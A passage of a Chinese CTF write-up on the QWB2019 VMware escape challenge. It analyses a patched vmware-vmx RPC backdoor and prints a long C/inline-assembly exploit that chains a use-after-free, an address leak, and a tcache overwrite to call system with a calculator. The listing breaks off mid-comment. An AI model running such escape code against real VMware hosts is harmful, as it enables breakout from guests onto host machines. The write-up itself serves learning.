> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5B7f4v_CVmp8SehduvFq0g)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjglKHc5s9PRxvJg3mCYibSl8nNpbwzRNTWkTPru7nPicOhEhV1OmN02BQ/640?wx_fmt=png)

**0×0** **前 言**

近期学习利用 Vmware 的 backdoor 机制进行虚拟机逃逸的攻击手法，借助 RWCTF2018 station-excape 的相关资料学习了解，以及在其 exp 的基础上进行调试修改，实现了 QWB2019 VMw 的虚拟机逃逸，第一次做这方面的工作，以此博客记录一下逆向、调试过程中的收获。  
相关资料链接贴在前面：r3kapig 有关 RWCTF2018 station-excape 的详细 wp，其中也有关于 backdoor 机制的详细介绍，膜一波大佬们。

**0×1** **题目分析**

*   ### **文件**
    

以我所了解到的，一般虚拟机逃逸类的题目都会给一个虚拟机环境（没错就是虚拟机套虚拟机），然后给一个 patch 过的组件，本题就是 vmware-vmx-patched。  
用 010editor 进行比对。比对结果如下。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjiaicMkbPAJ3OIXqc0db1Gea4AiamuzLXmRBATWBib1eaZKeWKZDkCXpc7Q/640?wx_fmt=png)

发现 patch 后的组件与原版本的组件有三处区别。IDA 打开后，跳转到三处地址查看改动。第一处改动将 jz 改为 jmp 无条件跳转。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjibGFEmYcnj8LjHzqXbHLxNTte1dSrIicfJ1SQJ3eK6iacPLtricSdtFAwQ/640?wx_fmt=png)

第二处将跳转条件由 ja 改为 jnb。即大于改为大于等于。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjZx6SbcVN7ZOvTbiafe5NSjZKTS1pPdvW0XxTibeTHBbvGWgwcHngOoWg/640?wx_fmt=png)

第三处将 realloc 传参时 size 由 dword 改为 word，即四字节变为两字节。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjwibDNs3gkIH6KRVbt2KrkibtMQTCJDeFUttU3nEuehOWvBickWUBBvcBA/640?wx_fmt=png)

分析到这里就感觉这是关键漏洞点了，realloc（ptr,size）函数当 size 为 0 时功能相当于 free（ptr）。再看一下伪代码。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjqG1q5R1Rv2ak9tvicgWWiboK8G04CaNLn0BEGUBOt0d0wicju1aMdBv4Q/640?wx_fmt=png)

这段代码在处理 Send_RPC_command_length 过程中，在发送 RPC_Command 前会先发送 RPC commad 的长度，接收 size 值后，会先判断是否大于 0x10000，然后判断是否大于 RPCI 结构体中记录的 size，注意这些比较都是以四字节 int 的比较，但是在给 realloc 传参数的时候却以 word，即两字节传入，会导致一个问题是，如果发送的 size=0xffff，可以通过第一步 size<=0x10000 检查，并且在 realloc 传参时，LOWORD（v31）= (0xffff+1) & 0xffff ，即 v31=0 。

分析到这里，攻击思路如下，先 Send_RPC_command_length 设置一个 size，然后 Send_RPC_command_length，size=0xffff ，即将前面申请的堆块释放，并且指针残留在了 RPCI 结构体中，造成 UAF 的可能。

*   ### **IDA 静态分析**
    

Vmx 可执行文件中处理 rpc 指令的函数为下图函数，地址为 0x189370

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjSbkuspUAFPwUbRw2Aokcm67kIibVL2vII9vPeZMNvKYFoPjwSaxdsEA/640?wx_fmt=png)

其中的符号为我手动添加。其中的 getrpccap 函数功能为获取 rpc 通信数据包，、根据参数不同获取 rpc 数据包中内容、大小等属性该函数共有六个 case，与 rpc 六个指令一一对应：

#### Case 0，open channel：

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgj33wib5nvWvyzs2ISSFeur0PC16egpsKOM3qCMn99icn5MGTrHLoRh6Qg/640?wx_fmt=png)

该功能比较简短，读取了发来的 rpc 包里的 magicnumber

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjr10YKFjw7eGWgT4GicMhibx0oziaroBq6WpcU4DxZ5Vx3j9kCRDoKl8DA/640?wx_fmt=png)

然后在后面进行了 cookie 的设置和时间的设置

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjwVIUcSFQMfMlx6icVuzNZwsVw91cUZZz8lAiarVEuSsR4s4F4TP9BO4g/640?wx_fmt=png)

#### Case 01 set len

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjnFNUNs7DibvblDwUqOe1VcQ3RT7bsqLu5JKM6K1qNJDpDe2UHbuhHpw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjDdshq0ibhbKg8YCnKttJVfVOiazick7oMoJVoTzP9IOFp8iaicfzAHuN8ug/640?wx_fmt=png)

该指令的内容部分对应的是长度，长度在接受包的时候就已经经过处理，如果超长会直接处理成 - 1，但后面也有个比较，推测这里是开发人员在扩展开发时未删减的部分。同时，在最开始会有个对 fe9584 处标志位的判断，推测为包内容错误的判断标志位，若内容接受出错则直接结束。下面有个对设置长度和现有长度的判断，若接受长度比现有长度小就会调用注册的函数表中错误处理的部分。比现有长度大则会进入空间扩展，会调用 realloc 进行堆操作, 修改 rpc 结构中的数据缓冲区指针。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjcOwicclWhOL89LfH7L07dicqaa5EAkosd8ibR7hkts6ia9HgWvG8dDiaCUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjwk65b1j9icBFNtTDiaFOXHib8icoDYchiaxwKAVfia3H9nVAKdTPFt8l4uCQ/640?wx_fmt=png)

#### Case 02 send data

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjcia13hficJezNtu0oial2icwTCtZgEiceyLWGQhRAia7SiatOS6TQIRmoJy2Q/640?wx_fmt=png)

该 case 开头先调用函数获取了命令包的内容，v21 参数里面存的就是发送的内容，内容一次最多四字节，v22 里面是打开的 channel 的命令数据缓冲区，后面会判断 chanell 的状态，如果不是待读取状态是不会开始读取的。读取时会根据发送时指定的长度来进行复制。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgj0TR9jsjDv8rUEOO5UwHaGialCQickcyXlLd7QdWbcZYv8U9CfdmC0c9g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjkkxhPex0B9q3DZSqxj3RHS06wDgk6L9phnRRqLiacMeS8jOVbdJwTyA/640?wx_fmt=png)

可以看到把我们发送的四个字节指令（在 rbp 中）复制到了 rdx 指向的地址中

复制完后会把 rpc 结构体的一个代表未接收长度的属性减去接收的值，如果已经接收完了，会根据一个类似虚表的东西来调用对应的命令处理函数，然后把 rpc 状态修改为 1。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjIB9yzgbS2NlgzMDrFib53c6U9UO8wKchWDpBnmSRjx12EPvV5MIRqMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjcN9JkCg4oPqlwAPDlN2Q294NTT7tXSWlHDkU1mBwOGcIPyY2MQ9xMw/640?wx_fmt=png)

该函数的参数为指令本身以及指令长度，寻址方式为将命令与存在表中的字符串比较，找到对应的处理函数，调用以进行处理

安装函数的函数为下面这个，地址为 0x114866

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjFzJlEE3AkXDgvvqh2HYdianYElx39LpxPz3aHzKgibGg4QticVMD5ZQZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjfA1UAWmqvDVGEcs2IewCWE7DhA5c13y1bMWr1TjicmpMsPATfibjt0jQ/640?wx_fmt=png)

存储字符串指针的表位置为 0x111df80, 存储函数的位置也在附近，不过寻址方式不太一样。存储区域比较大。在执行指令时，会申请一个 0x20 大小的堆

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjobmcNqJx0cfVIAsUYPlnC75FZibWIEHic6o3ibf5rRKvEwZ2eMDlEqqMg/640?wx_fmt=png)

寻址函数地址为 0x177d61

#### Case 03 reply length

该 case 功能为发送给客户机返回数据的长度

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjjYHggEHc3PevgxVauic49bQ11iauxMiaRdPMLgqG3kE0fLDrqeojGBASQ/640?wx_fmt=png)

功能也比较简单，得到对应 channel 的指针，判断是否为接受完数据的状态，然后设置发送长度和发送数据缓冲区

#### Case 04 reply data

这个功能为发送执行指令后的返回数据

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjtx78fMCMbhr0hMN4UZD40v3BuNmeP3yyTNHEYumtJr48WCxibVZ29Hw/640?wx_fmt=png)

开头也是获得 channel 指针，然后设置 channel 的发送缓冲区和发送长度，一次同样只能发送四字节，如果最后不够就会发送剩余长度的数据

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjbg1BROuQu3fFys9wqcqtjXH0h2oZHdyxWA4YF9DRD1UOIN1yoDI42A/640?wx_fmt=png)

最后会把 rpc 的状态修改为发送完毕

#### Case 05 finish receive reply

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjrnMv2fUNibOGRc0b4z7IChpUCKrDyNLbF7JkApRlGbKrW0K6wxzBLbw/640?wx_fmt=png)

该功能为结束接受返回信息。读取 rpc 指针，判断是否为发送完毕状态，然后会设置状态为 1，完成状态闭环，出错的时候会有错误处理，输出错误提示

#### Case 06 close channel

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjEIUO4vSiab5esYtl7kNbUjic9xhZp9YqTFPB5gB2MBnJ7mIr9q6zvQFA/640?wx_fmt=png)

该功能为关闭 channel，获取 rpc 指针后判断其数据区指针是否为空，为空说明它非开启状态，不为空就调用函数进行关闭处理。

*   #### **小结**
    

这部分分析是为了理清 backdoor 机制中 host 与 guest 的交互机制，尤其是涉及到内存分配与回收操作的部分，以及 patch 部分代码要尤其关注，漏洞点一定是在 patch 代码附近，以本样本为例，主要部分为 case 01 set len , 尤其注意 realoc（） 函数。

**0×2****EXP 编写**

*   ### **leak**
    

经过静态分析和调试的验证，仿照 Real World CTF 2018 Finals Station-Escape 的思路编写 EXP。

首先分析本次逃逸的漏洞点与先前的区别，Rwctf 的逃逸样本 UAF 发生在 output 申请到的堆块，即 info-set guestinfo.a xxx，在调用 info-get 是会申请对应 xxx 大小的堆块作为缓冲区存放 xxx 内容，而 QWB 的逃逸样本漏洞点出在 Send RPC command length 中申请的堆块。

所以 leak 基地址思路与 rwctf 类似。使用 run_cmd（info-set guestinfo.a xxx），预设一个 0x100 的 guestinfo.a。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjmFGTqC9d2KjPAD96V2xCM3SKicZHMOkkDDsgof0dXAMyqymfypPrzbQ/640?wx_fmt=png)

打开一个 channel_0，先通过 Send RPC command length 申请一个 0x100 大小的堆块。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjibhpczykIHZyQVGeaJzTbRN4el7FHHM59UumSCicHVuILicj2AxxX3FSQ/640?wx_fmt=png)

然后打开 channel_1，发送 info-get guestinfo.a 命令，这里有一个小 tip，Send RPC command data 时每次发送四个字节，并且在接收完完整的 command 后才会执行命令，为了防止 Send RPC command data 的过程中有其他堆操作影响漏洞利用，先 send command 的前 strlen（command）- 4 个字节，然后 channel_0 发送 Send RPC command length，设置 size 为 0xffff，释放掉 channel_0 中申请的 0x100 堆块到 tcache[0x110] 的头。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgj54WjRick3dSrwRyP9gYziaeV5kIlBFEuIKx0d697zW9JX38u3MPAGmFA/640?wx_fmt=png)

发送完 info-get guestinfo.a 命令后，会 malloc(strlen(guestinfo.a))，作为 output 缓冲区，因为此时 tcache[0x110] 头是我们刚刚释放的 channel_0 的 command 块，会将该块分配出来作为输出缓冲区，但是 channel_0_struct_RPCI->heap_ptr 中仍保存了堆指针，此时 guestinfo.a = channel_0_struct_RPCI->heap_ptr。

然后下一步就是与 rwctf 相同的思路，再次释放该堆块到 tcache[0x110] 头，利用 vmx.capability.dnd_version ，将 obj 申请到 guestinfo.a 的 output 缓冲区，利用 obj 中的 vtable 泄露 testbase。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjAibNtNlAvFiaqvtrmibtO7EuynNjbribGfMlW910Ps2YZu8U0ebBQiaRwyQ/640?wx_fmt=png)

*   ### **exploit**
    

利用过程同样类似，打开 channel_0 的用来申请一个 size0 的堆块，释放后用 channel_1 申请回来，然后 channel_0 再次释放，造成 UAF，利用 channel_1 来写入数据，修改 tcache 的 fd，造成任意地址写，channel_2 申请一次，channel_3 申请到伪造 fd 处。

那么如何伪造 fd。调试中发现，在 后，会 call [r8+rax*1+0x8] ，并且第一个参数 rdi = [rdi+rax] 。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgj5nFw1k39SSDoQn500oMAuJljG7A5T2AQ3argotphaicKic5Q7u18d6yg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjatlVGXdNBj8ib3zxXcEH396dFEBY9AicygMJUokyRTEn4r9BIw25enicA/640?wx_fmt=png)

Rdi 与 r8 寄存器中地址相近，rax=0，那么如果将 fd 伪造到 r8 处，在 r8+8 处写入 system 地址，rdi 处写入 gnome-calculator\x00 即可弹出计算器。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjapqMaR6OXblqXfcVt98wFvfVEOoJwiaVQWTZcrzOzmNVdjVZialAGdEw/640?wx_fmt=png)

最后效果演示：（妈妈我也会弹计算器了！）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb5hEPHe4k2CYU6qlUyOPdgjTmp70qO2WiaVwG0u8HibsEa9gicHvq5lvSV5gmwlRD5ZgFKw1U1XNpw4A/640?wx_fmt=png)

**0×3** **完整 exp**

```
#include <stdio.h>
#include <stdint.h>
void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rdi,%%r10\n\t"
        "movq %%rsi,%%r11\n\t"
        "movq %%rdx,%%r12\n\t"
        "movq %%rcx,%%r13\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x49435052,%%ebx\n\t"
        "movl $0x1e,%%ecx\n\t"
        "movl $0x5658,%%edx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%edi,(%%r10)\n\t"
        "movl %%esi,(%%r11)\n\t"
        "movl %%edx,(%%r12)\n\t"
        "movl %%ecx,(%%r13)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r8","%r10","%r11","%r12","%r13"
       );
}

void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movl %%ecx,%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0001001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}

void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $0,%%r12\n\t"
        "1:\n\t"
        "movq %%r8,%%rbp\n\t"
        "add %%r12,%%rbp\n\t"
        "movl (%%rbp),%%ebx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0002001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "addq $4,%%r12\n\t"
        "cmpq %%r12,%%r11\n\t"
        "ja 1b\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
        );
}

void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%r8,%%r10\n\t"
        "movq %%rcx,%%r11\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0003001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "movl %%ebx,(%%r11)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11"
       );

}

void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
    asm("pushq %%rbp\n\t"
        "movq %%r9,%%r10\n\t"
        "movq %%r8,%%rbp\n\t"
        "movq %%rcx,%%r11\n\t"
        "movq $1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0004001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "in %%dx,%%eax\n\t"
        "add %%r11,%%rbp\n\t"
        "movl %%ebx,(%%rbp)\n\t"
        "movl %%ecx,(%%r10)\n\t"
        "popq %%rbp\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10","%r11","%r12"
       );
}

void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x1,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movq $0x21,%%rbx\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0005001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
void channel_close(int cookie1,int cookie2,int channel_num,int *res){
    asm("movl %%eax,%%ebx\n\t"
        "movq %%rcx,%%r10\n\t"
        "movl $0x564d5868,%%eax\n\t"
        "movl $0x0006001e,%%ecx\n\t"
        "movw $0x5658,%%dx\n\t"
        "out %%eax,%%dx\n\t"
        "movl %%ecx,(%%r10)\n\t"
        :
        :
        :"%rax","%rbx","%rcx","%rdx","%rsi","%rdi","%r10"
       );
}
struct channel{
    int cookie1;
    int cookie2;
    int num;
};
uint64_t heap =0;
uint64_t text =0;
void run_cmd(char *cmd){
    struct channel tmp;
    int res,len,i;
    char *data;
    channel_open(&tmp.cookie1,&tmp.cookie2,&tmp.num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&res);

    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&res);
    if(!res){
        printf("fail to recv finish\n");
    }

    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&res);
    if(!res){
        printf("fail to close channel\n");
        return;
    }
}
void leak(){
    struct channel chan[10];
    int res=0;
    int len,i;    
    char pay[8192];
    char *s1 = "info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *data;
    char *s2 = "info-get guestinfo.a";
    char *s21= "info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *s3 = "1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char *s4 = "tools.capability.dnd_version 4";
    char *s5 = "vmx.capability.dnd_version";
    //init data
    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
    run_cmd(s4);


    //first step 
    channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),&res);//strlen(s21) = 0x100
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s21),s2,&res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i++){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    //second step free the reply and let the other channel get it.

    channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }

    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&res);
    if(!res){
        printf("fail to send data\n");
        return;
    }

    //free the output buffer
    printf("Freeing the buffer....,bp:0x5555556DD3EF\n");
    getchar();
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
    if(!res){
        printf("fail to recv finish1\n");
        return;
    }
    //finished sending the command, should get the freed buffer
    printf("Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n");
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&s2[16],&res);
    if(!res){
        printf("fail to send data\n");
        return;
    }

    //third step,free it again
    //set status to be 4


    //free the output buffer
    printf("Free the buffer again...\n");
    getchar();
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);

    if(!res){
        printf("fail to recv finish2\n");
        return;
    }

    printf("Trying to reuse the buffer as a struct, which we can leak..\n");
    getchar();
    run_cmd(s5);
    printf("Should be done.Check the buffer\n");
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&res);
    }
    printf("recv data:\n");
    for(i=0;i<len;i+=8){
        printf("recv data:%lx\n",*(long long *)&data[i]);
    }
    text = (*(uint64_t *)data)-0xf818d0;
    channel_recv_finish(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    printf("Leak Success\n");
}

void exploit(){
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = "info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s2 = "info-get guestinfo.b";
    char *s3 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    char *s4 = "gnome-calculator\x00";
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFE0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = "gnome-calculator\x00";
    //run_cmd(s1);
    channel_open(&chan[0].cookie1,&chan[0].cookie2,&chan[0].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s1),s1,&res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
    if(!res){
        printf("fail to recv data len\n");
        return;
    }
    printf("recv len:%d\n",len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i<len+0x10;i+=4){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&res);
    }
    printf("recv data:%s\n",data);
    channel_open(&chan[1].cookie1,&chan[1].cookie2,&chan[1].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_open(&chan[2].cookie1,&chan[2].cookie2,&chan[2].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    channel_open(&chan[3].cookie1,&chan[3].cookie2,&chan[3].num,&res);
    if(!res){
        printf("fail to open channel!\n");
        return;
    }
    //channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&res);
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,0xffff,&res);
    if(!res){
        printf("fail to recv finish2\n");
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&res);
    if(!res){
        printf("fail to set len\n");
        return;
    }
    printf("leak2 success\n");
    /***
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&len,&res);
